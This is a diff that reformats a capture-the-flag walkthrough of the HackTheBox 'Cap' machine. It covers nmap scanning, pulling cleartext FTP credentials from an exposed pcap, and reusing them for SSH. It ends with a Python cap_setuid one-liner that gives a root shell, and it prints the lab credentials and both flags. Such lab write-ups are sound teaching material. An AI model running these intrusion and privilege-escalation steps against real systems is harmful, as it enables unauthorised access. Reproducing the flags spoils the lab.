@@ -1,71 +1,158 @@
-HTB - [Machine Name] Walkthrough
-Initial Enumeration
-We start with a thorough Nmap scan to identify open ports and services on the target machine.
+---
+layout: default
+title: "HackTheBox — Cap Walkthrough (10.10.10.245)"
+---
 
-Bash
+# 🚩 HackTheBox — Cap Walkthrough
 
-nmap -sV -p- 10.10.10.245
-The scan reveals three open ports:
+Welcome to my detailed walkthrough of the **Cap** machine on HackTheBox.  
+This writeup takes you through **enumeration → exploitation → privilege escalation**, with commands, outputs, and commentary, so you don’t just follow along but *understand each step*.
 
-Port 21: FTP running vsftpd 3.0.3
+---
 
-Port 22: SSH running OpenSSH 8.2p1
+## 🕵️ Reconnaissance
 
-Port 80: HTTP running Gunicorn, with a title of "Security Dashboard".
+The first step is always to see what the target is running.  
+Using **Nmap** with scripts and version detection:
 
-<br>
+```bash
+nmap -sC -sV -oN nmap_scan.txt 10.10.10.245
+```
 
-Foothold: Exploring the Web Server
-The web server on port 80 shows a "Security Dashboard" and a /data directory. After navigating to /data, we find a .pcap file (packet capture) which we can download and analyze.
+**Results:**
+```
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+80/tcp open  http    Gunicorn (http-server-header: gunicorn)
+```
 
-Bash
+So we have:
+- **FTP** (21)  
+- **SSH** (22)  
+- **HTTP** (80)  
 
-wget http://10.10.10.245/data/security_snapshot.pcap
-We use a tool like Wireshark to inspect the .pcap file for any interesting information.
+The web service claims to be a **Security Dashboard**. Suspicious and interesting 😎
 
-<br>
+---
 
-Gaining Access via FTP
-Upon analyzing the packet capture, we discover credentials for the FTP service.
+## 🌐 Web Enumeration
 
-Username: nathan
+Browsing to `http://10.10.10.245/` shows a **Security Dashboard**.  
+Digging deeper, I noticed a `/data/` directory containing a `.pcap` capture file.
 
-Password: Buck3tH4TF0RM3!
+👉 Whenever you see `.pcap` files exposed on a challenge, it’s basically free treasure. Let’s grab it:
 
-We test these credentials and find that they also work for the SSH service on port 22, giving us a shell on the machine as the user nathan.
+```bash
+wget http://10.10.10.245/data/1.pcap -O cap.pcap
+```
 
-Bash
+---
 
+## 📡 PCAP Analysis
+
+I opened the file with `tshark` to look at FTP credentials:
+
+```bash
+tshark -r cap.pcap -Y "ftp.request.command == \"USER\" or ftp.request.command == \"PASS\""        -T fields -e ftp.request.command -e ftp.request.arg
+```
+
+**Output:**
+```
+USER nathan
+PASS Buck3tH4TF0RM3!
+```
+
+🔥 Jackpot — cleartext FTP credentials!  
+
+---
+
+## 🔑 Getting Access
+
+First, I verified the credentials via FTP:
+
+```bash
+ftp 10.10.10.245
+# login: nathan / Buck3tH4TF0RM3!
+```
+
+That worked. Since SSH was also open, I tried the same credentials there:
+
+```bash
 ssh nathan@10.10.10.245
-With user access, we can now retrieve the user flag.
+```
 
+💡 Success — we’re in as **nathan**!
+
+---
+
+## 🧑‍💻 User Flag
+
+Navigating to Nathan’s home directory:
+
+```bash
+cat user.txt
+```
+
+**Flag:**  
+```
 6e89061b7afba09dfa066e55e390c53d
+```
 
-<br>
+---
 
-Privilege Escalation
-After gaining a user shell, our next step is to escalate privileges to root. We run LinPEAS to scan the system for potential vulnerabilities and misconfigurations.
+## ⬆️ Privilege Escalation
 
-Bash
+Time to go root. Running **linpeas** (or manual checks) revealed something spicy:
 
-# We can transfer linpeas.sh to the target machine using scp
-scp linpeas.sh nathan@10.10.10.245:/tmp/
-# Then execute it on the target
-chmod +x /tmp/linpeas.sh
-/tmp/linpeas.sh
-<br>
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
 
-The LinPEAS output highlights that python3.8 has the cap_setuid capability, which allows it to change the User ID of a process. This is a significant finding that we can exploit to become root. We can use this capability to change our process's User ID to 0 (root) and then execute a root shell.
+That means **Python3.8 has special Linux capabilities** which allow it to set the user ID. In simple terms: it can make itself root.
 
-We write and execute a simple Python script to perform this action.
+### Exploit with a one-liner:
+```bash
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
 
-Python
+Boom 💥 — we’re root.
 
-import os
-os.setuid(0)
-os.system("/bin/bash")
-After running the script, we successfully gain a root shell.
+---
 
-We can now read the contents of the root.txt file and claim the root flag.
+## 👑 Root Flag
 
+Now that we have root, let’s grab the final flag:
+
+```bash
+cat /root/root.txt
+```
+
+**Flag:**  
+```
 69d7ea1977e866c3e9ba8c5ff6abe8f0
+```
+
+---
+
+## 📝 Lessons Learned
+
+- `.pcap` files can leak **sensitive credentials** (FTP cleartext login in this case).  
+- **Linux capabilities** can be as dangerous as `SUID` binaries if misconfigured.  
+- Always check binaries with `getcap -r / 2>/dev/null`.
+
+---
+
+## 🎯 Final Thoughts
+
+This was a neat box:
+- Light recon → web → pcap analysis  
+- Quick creds reuse for SSH  
+- Clever privilege escalation via Python capabilities  
+
+It’s a perfect beginner-friendly machine that teaches:
+- Traffic capture analysis
+- Credential harvesting
+- Misconfigured binary exploitation
+
+Happy hacking! ⚡
